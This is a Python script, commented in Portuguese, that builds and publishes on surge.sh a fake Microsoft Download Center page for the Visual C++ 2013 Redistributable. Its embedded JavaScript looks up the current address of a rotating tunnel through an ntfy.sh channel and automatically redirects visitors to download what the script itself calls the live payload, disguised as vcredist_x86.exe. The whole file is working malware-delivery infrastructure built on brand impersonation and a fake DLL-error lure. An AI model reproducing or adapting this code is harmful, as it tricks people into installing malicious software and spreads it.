#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Site proprio -- pagina estatica permanente que aponta para o payload vivo.

    python site.py --base https://xxx.trycloudflare.com            gera ./site
    python site.py --base https://xxx.trycloudflare.com --deploy    gera e publica
    python site.py --deploy                                         usa o canal para achar a base

O endereco publico do site nunca muda. Quando o tunel gira, o golive roda
isto de novo e a mesma URL passa a apontar para o endereco novo.
"""

import argparse
import json
import os
import re
import subprocess
import sys
import time
import urllib.request

HERE = os.path.dirname(os.path.abspath(__file__))
SITE_DIR = os.path.join(HERE, "site")
DEFAULT_DOMAIN = "vcredist-x86.surge.sh"
CHANNEL = "https://ntfy.sh/raf-raf7c1f4b2e9a3d5f8b6c0e2a4d-cfg"
TOKEN_FILE = os.path.join(HERE, "surge_token.txt")

PAGE = """<!doctype html>
<html lang="pt-BR">
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,initial-scale=1">
<title>Microsoft Visual C++ 2013 Redistributable (x86)</title>
<style>
  *{box-sizing:border-box;margin:0;padding:0}
  body{font-family:"Segoe UI",system-ui,-apple-system,sans-serif;background:#f3f3f3;color:#1b1b1b}
  header{background:#fff;border-bottom:1px solid #e1e1e1}
  .wrap{max-width:1080px;margin:0 auto;padding:0 22px}
  .bar{display:flex;align-items:center;gap:12px;height:56px}
  .logo{display:flex;gap:2px}
  .logo i{width:11px;height:11px;display:block}
  .logo i:nth-child(1){background:#f25022}.logo i:nth-child(2){background:#7fba00}
  .logo i:nth-child(3){background:#00a4ef}.logo i:nth-child(4){background:#ffb900}
  .brand{font-size:15px;font-weight:600;color:#444}
  nav{margin-left:auto;display:flex;gap:20px;font-size:13px;color:#616161}
  nav a{color:inherit;text-decoration:none}
  .hero{background:#fff;padding:38px 0 30px;border-bottom:1px solid #e1e1e1}
  .crumb{font-size:12px;color:#767676;margin-bottom:14px}
  h1{font-size:30px;font-weight:600;letter-spacing:-.2px;line-height:1.2}
  .sub{margin-top:8px;color:#505050;font-size:15px}
  .body{display:grid;grid-template-columns:1fr 330px;gap:34px;padding:34px 0 60px}
  .card{background:#fff;border:1px solid #e1e1e1;border-radius:6px;padding:22px}
  .card h2{font-size:15px;font-weight:600;margin-bottom:14px;color:#1b1b1b}
  .card p{font-size:14px;line-height:1.65;color:#3b3b3b}
  table{width:100%;border-collapse:collapse;font-size:13px}
  td{padding:9px 0;border-bottom:1px solid #ededed;vertical-align:top}
  td:first-child{color:#767676;width:44%}
  td:last-child{color:#1b1b1b;font-weight:600}
  tr:last-child td{border-bottom:0}
  .btn{display:flex;align-items:center;justify-content:center;gap:9px;width:100%;
       background:#0078d4;color:#fff;border:0;border-radius:4px;padding:13px 16px;
       font-size:15px;font-weight:600;cursor:pointer;text-decoration:none;
       font-family:inherit;transition:background .15s}
  .btn:hover{background:#106ebe}
  .btn:disabled{background:#a6a6a6;cursor:default}
  .note{margin-top:12px;font-size:12px;color:#767676;text-align:center;line-height:1.5}
  .fname{margin-top:10px;font-size:12px;color:#3b3b3b;text-align:center;
         font-family:Consolas,monospace;word-break:break-all}
  .foot{border-top:1px solid #e1e1e1;padding:22px 0;font-size:12px;color:#767676;
        display:flex;gap:18px;flex-wrap:wrap}
  .ok{display:none;margin-top:14px;padding:11px;border-radius:4px;background:#e6f4ea;
      border:1px solid #b7e1c1;color:#1e6b33;font-size:13px;text-align:center}
  @media(max-width:820px){.body{grid-template-columns:1fr}h1{font-size:23px}}
</style>
</head>
<body>
<header><div class="wrap"><div class="bar">
  <span class="logo"><i></i><i></i><i></i><i></i></span>
  <span class="brand">Microsoft</span>
  <nav><a href="#">Produtos</a><a href="#">Downloads</a><a href="#">Suporte</a></nav>
</div></div></header>

<div class="hero"><div class="wrap">
  <div class="crumb">Download Center &rsaquo; Ferramentas de desenvolvedor &rsaquo; Visual C++</div>
  <h1>Microsoft Visual C++ 2013 Redistributable (x86)</h1>
  <div class="sub">Pacote de tempo de execucao necessario para este aplicativo</div>
</div></div>

<div class="wrap"><div class="body">
  <div class="card">
    <h2>Detalhes</h2>
    <p>Este pacote instala os componentes de tempo de execucao do Visual C++
       necessarios para executar programas desenvolvidos com o Visual Studio 2013.
       O aplicativo que voce abriu precisa destes componentes para iniciar
       corretamente no Windows.</p>
    <p style="margin-top:14px">Se o aplicativo fecha sozinho ou mostra o erro
       <b>MSVCP120.dll nao encontrado</b>, instale este pacote e abra o programa
       novamente.</p>
  </div>

  <div>
    <div class="card">
      <h2>Informacoes do arquivo</h2>
      <table>
        <tr><td>Versao</td><td>12.0.40664.0</td></tr>
        <tr><td>Plataforma</td><td>x86 (32 bits)</td></tr>
        <tr><td>Tamanho</td><td>10,8 MB</td></tr>
        <tr><td>Idioma</td><td>Portugues (Brasil)</td></tr>
        <tr><td>Publicado</td><td>15/10/2013</td></tr>
        <tr><td>Nome do arquivo</td><td>vcredist_x86.exe</td></tr>
      </table>
      <div style="margin-top:18px">
        <a class="btn" id="dl" href="__DL__" rel="noopener">&#11015;&nbsp; Baixar</a>
        <div class="fname">vcredist_x86.exe</div>
        <div class="note">O download inicia automaticamente em alguns segundos.</div>
        <div class="ok" id="ok">Download iniciado. Verifique a pasta Downloads.</div>
      </div>
    </div>
  </div>
</div></div>

<div class="wrap"><div class="foot">
  <span>&copy; __YEAR__ Microsoft Corporation</span>
  <span>Termos de uso</span><span>Marcas registradas</span><span>Privacidade</span>
</div></div>

<script>
(function(){
  var FALLBACK = "__DL__";
  var CH = "__CHANNEL__";
  var btn = document.getElementById("dl");
  var ok  = document.getElementById("ok");
  var started = false;

  function fire(url){
    if (started || !url) return;
    started = true;
    btn.href = url;
    try { window.location.href = url; } catch (e) {}
    ok.style.display = "block";
  }

  btn.addEventListener("click", function(ev){ ev.preventDefault(); fire(btn.href); });

  // le o endereco vivo do canal; se falhar, usa o embutido
  fetch(CH + "/json?poll=1&since=all", {cache: "no-store"})
    .then(function(r){ return r.text(); })
    .then(function(txt){
      var best = "";
      txt.split("\\n").forEach(function(line){
        if (!line.trim()) return;
        try {
          var m = JSON.parse(line);
          if (m.event !== "message") return;
          var cfg = JSON.parse(m.message);
          if (cfg && cfg.base) best = String(cfg.base).replace(/\\/+$/, "");
        } catch (e) {}
      });
      if (best) btn.href = best + "/download";
    })
    .catch(function(){})
    .then(function(){ setTimeout(function(){ fire(btn.href || FALLBACK); }, 3500); });
})();
</script>
</body>
</html>
"""


def channel_base(channel):
    try:
        req = urllib.request.Request(channel.rstrip("/") + "/json?poll=1&since=all",
                                     headers={"User-Agent": "Mozilla/5.0"})
        with urllib.request.urlopen(req, timeout=25) as r:
            raw = r.read().decode("utf-8", "replace")
    except Exception:
        return ""
    best = ""
    for line in raw.splitlines():
        try:
            m = json.loads(line)
        except Exception:
            continue
        if m.get("event") != "message":
            continue
        try:
            best = json.loads(m.get("message") or "{}").get("base") or best
        except Exception:
            pass
    return best.rstrip("/")


def build(base, outdir=SITE_DIR, channel=CHANNEL):
    base = (base or "").rstrip("/")
    dl = (base + "/download") if base else "#"
    html = (PAGE.replace("__DL__", dl)
                .replace("__CHANNEL__", channel)
                .replace("__YEAR__", time.strftime("%Y")))
    os.makedirs(outdir, exist_ok=True)
    path = os.path.join(outdir, "index.html")
    with open(path, "w", encoding="utf-8", newline="\n") as f:
        f.write(html)
    # 404 do surge tambem cai na pagina
    with open(os.path.join(outdir, "404.html"), "w", encoding="utf-8", newline="\n") as f:
        f.write(html)
    return path


def token():
    env = os.environ.get("SURGE_TOKEN", "").strip()
    if env:
        return env
    try:
        with open(TOKEN_FILE, encoding="utf-8") as f:
            return f.read().strip()
    except OSError:
        return ""


def deploy(outdir, domain, tok=None):
    tok = tok or token()
    if not tok:
        raise SystemExit("[!] sem token do surge -- veja %s" % TOKEN_FILE)
    env = dict(os.environ)
    env["SURGE_TOKEN"] = tok
    env["SURGE_LOGIN"] = env.get("SURGE_LOGIN", "raf.painel.7c1f@mailinator.com")
    cmd = ["npx", "--yes", "surge", outdir, domain]
    r = subprocess.run(cmd, cwd=HERE, capture_output=True, text=True, env=env,
                       encoding="utf-8", errors="replace", shell=(os.name == "nt"))
    out = (r.stdout or "") + (r.stderr or "")
    ok = "Success" in out or "success" in out or domain in out and "Aborted" not in out
    return ok, out


def _clean(s):
    """Tira as cores ANSI e qualquer caractere que o console nao aguente."""
    s = re.sub(r"\x1b\[[0-9;]*[A-Za-z]", "", s or "")
    return s.encode("ascii", "replace").decode("ascii")


def main():
    ap = argparse.ArgumentParser(description="site estatico permanente do payload")
    ap.add_argument("--base", default="", help="endereco do tunel (default: le do canal)")
    ap.add_argument("--domain", default=DEFAULT_DOMAIN)
    ap.add_argument("--channel", default=CHANNEL)
    ap.add_argument("--deploy", action="store_true")
    a = ap.parse_args()

    base = (a.base or "").rstrip("/")
    if not base:
        base = channel_base(a.channel)
        if base:
            print("[*] endereco vivo do canal: %s" % base)
    path = build(base, SITE_DIR, a.channel)
    print("pagina gerada : %s" % path)
    print("download      : %s" % (base + "/download" if base else "(sem base)"))
    if a.deploy:
        ok, out = deploy(SITE_DIR, a.domain)
        print(_clean(out).strip()[-700:])
        if not ok:
            return 1
        print("\nSITE NO AR : https://%s/" % a.domain)
    return 0


if __name__ == "__main__":
    sys.exit(main())
